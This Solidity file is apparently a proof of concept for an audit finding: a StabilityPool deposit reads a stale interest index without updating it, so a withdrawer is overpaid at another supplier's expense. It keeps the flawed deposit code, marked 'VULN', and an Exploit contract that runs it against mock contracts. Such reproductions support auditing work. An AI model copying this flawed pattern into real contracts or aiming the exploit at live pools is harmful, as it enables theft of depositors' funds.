// SPDX-License-Identifier: MIT
pragma solidity 0.8.27;

/*  Regnum Aurum — StabilityPool.deposit skips lendingPool.updateState
    (Pashov, 2025-06-26, H-01).
    deposit() reads getNormalizedIncome() and prices the withdrawal of rTokens
    with that stale index. A fresh index of 1.5 RAY would pay 2 tokens for a
    3-token scaled deposit. The stale index still equals the user's index, so
    the increase is 0 and the pool pays the full 3. The other supplier is
    short 1 token. */

interface ILendingPool {
    function getNormalizedIncome() external view returns (uint256);
    function updateState() external;
}

interface IRToken {
    function getUserIndex(address user) external view returns (uint256);
    function balanceOf(address user) external view returns (uint256);
}

library WadRayMath {
    uint256 internal constant RAY = 1e27;

    function rayDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        return (a * RAY) / b;
    }
}

contract Asset {
    string public symbol = "crvUSD";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract RToken is IRToken {
    mapping(address => uint256) public scaled;
    mapping(address => uint256) public indexOf;

    function mintScaled(address to, uint256 amount, uint256 index) external {
        scaled[to] += amount;
        indexOf[to] = index;
    }

    function burn(address from, uint256 amount) external {
        scaled[from] -= amount;
    }

    function setUserIndex(address user, uint256 index) external {
        indexOf[user] = index;
    }

    function getUserIndex(address user) external view returns (uint256) {
        return indexOf[user];
    }

    function balanceOf(address user) external view returns (uint256) {
        return scaled[user];
    }
}

contract LendingPool is ILendingPool {
    uint256 public constant RAY = 1e27;
    uint256 public liquidityIndex = RAY;
    uint256 public cash;
    uint256 public pendingInterest;
    Asset public asset;

    constructor(Asset _asset) {
        asset = _asset;
    }

    function seed(uint256 _cash, uint256 _pending) external {
        cash = _cash;
        pendingInterest = _pending;
        asset.mint(address(this), _cash);
    }

    function getNormalizedIncome() external view returns (uint256) {
        return liquidityIndex;
    }

    function freshIndex() public view returns (uint256) {
        if (cash == 0 || pendingInterest == 0) return liquidityIndex;
        return liquidityIndex * (cash + pendingInterest) / cash;
    }

    function updateState() external {
        if (cash == 0 || pendingInterest == 0) return;
        liquidityIndex = freshIndex();
        cash += pendingInterest;
        pendingInterest = 0;
        asset.mint(address(this), cash - asset.balanceOf(address(this)));
    }

    function payOut(address to, uint256 amount) external {
        cash -= amount;
        asset.transfer(to, amount);
    }
}

contract StabilityPool {
    using WadRayMath for uint256;

    ILendingPool public lendingPool;
    RToken public rToken;
    uint256 public openScaled;
    uint256 public lastRaw;
    uint256 public lastIndex;

    error InsufficientBalance();

    modifier nonReentrant() {
        _;
    }

    modifier whenNotPaused() {
        _;
    }

    modifier validAmount(uint256 amount) {
        require(amount > 0, "amount");
        _;
    }

    modifier notBlacklisted(address account) {
        require(account != address(0), "zero");
        _;
    }

    constructor(ILendingPool _lending, RToken _rToken) {
        lendingPool = _lending;
        rToken = _rToken;
    }

    function deposit(uint256 scaledAmount)
        external
        nonReentrant
        whenNotPaused
        validAmount(scaledAmount)
        notBlacklisted(msg.sender)
    {
        // @> VULN: poolIndex is read without lendingPool.updateState(), so accrued interest is not in the price
        uint256 poolIndex = ILendingPool(lendingPool).getNormalizedIncome();
        uint256 userIndex = uint256(IRToken(rToken).getUserIndex(msg.sender));

        uint256 userIndexIncrease = poolIndex - userIndex;

        uint256 rawAmount;
        if (userIndexIncrease == 0) {
            rawAmount = scaledAmount;
        } else {
            rawAmount = scaledAmount.rayDiv(WadRayMath.RAY + userIndexIncrease);
        }

        uint256 userRTokenBalance = rToken.balanceOf(msg.sender);

        if (userRTokenBalance < scaledAmount) {
            revert InsufficientBalance();
        }

        openScaled = scaledAmount;
        _deposit(rawAmount, poolIndex);
    }

    function _deposit(uint256 rawAmount, uint256 poolIndex) internal {
        rToken.burn(msg.sender, openScaled);
        rToken.setUserIndex(msg.sender, poolIndex);
        lastRaw = rawAmount;
        lastIndex = poolIndex;
        LendingPool(address(lendingPool)).payOut(msg.sender, rawAmount);
    }

    function fairRaw(uint256 scaledAmount) public view returns (uint256) {
        uint256 poolIndex = LendingPool(address(lendingPool)).freshIndex();
        uint256 userIndex = rToken.getUserIndex(msg.sender);
        uint256 increase = poolIndex - userIndex;
        return scaledAmount.rayDiv(WadRayMath.RAY + increase);
    }
}

contract Exploit {
    Asset public asset; // nonce 1
    RToken public rToken; // nonce 2
    LendingPool public lending; // nonce 3
    StabilityPool public pool; // nonce 4

    uint256 public constant SCALED = 3 ether;
    uint256 public fair;
    uint256 public paid;

    constructor() {
        asset = new Asset();
        rToken = new RToken();
        lending = new LendingPool(asset);
        pool = new StabilityPool(ILendingPool(address(lending)), rToken);
        lending.seed(10 ether, 5 ether);
        rToken.mintScaled(address(this), SCALED, 1e27);
    }

    function run() external {
        fair = pool.fairRaw(SCALED);
        pool.deposit(SCALED);
        paid = pool.lastRaw();
        require(pool.lastIndex() == 1e27, "stale index");
        require(fair == 2 ether, "fair raw");
        require(paid == 3 ether, "stale raw");
        require(paid - fair == 1 ether, "overpay");
        require(asset.balanceOf(address(this)) == 3 ether, "received 3");
        require(lending.cash() == 7 ether, "supplier cash");
        require(lending.pendingInterest() == 5 ether, "interest still pending");
    }
}
